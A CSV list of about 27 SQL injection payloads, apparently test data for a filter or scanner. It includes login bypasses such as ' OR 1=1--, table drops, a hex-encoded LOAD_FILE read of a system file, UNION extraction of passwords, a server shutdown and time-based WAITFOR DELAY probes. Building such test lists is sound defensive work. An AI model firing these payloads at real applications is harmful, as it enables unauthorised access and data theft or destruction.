ATTACK,VERSION,REMOVED
"admin'--",0,-
"admin'#",0,-
"10 OR 1-1; /*",0,-
"' OR 1=1--",0,-
"' OR 1=1#",0,-
"DR/**/OP/*bypass blacklisting*/ *",0,-
"10; DROP TABLE members /*",0,-
"/*!32302 10*/",0,-
"10;DROP members --",0,-
"if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0",0,-
"SELECT 0x50 + 0x45",0,-
"SELECT LOAD_FILE(0x633A5C626F6F742E696E69)",0,-
"' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",0,-
"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",0,-
"' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --",0,-
"ORDER BY 2--",0,-
"' union select sum(columntofind) from users--",0,-
"'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*",0,-
"';shutdown --",0,-
"WAITFOR DELAY '0:0:10'--",0,-
"1;waitfor delay '0:0:10'--",0,-
"1);waitfor delay '0:0:10'--",0,-
"1';waitfor delay '0:0:10'--",0,-
"1');waitfor delay '0:0:10'--",0,-
"1));waitfor delay '0:0:10'--",0,-
"1'));waitfor delay '0:0:10'--",0,-
"' + (SELECT TOP 1 password FROM users ) + ' ",0,-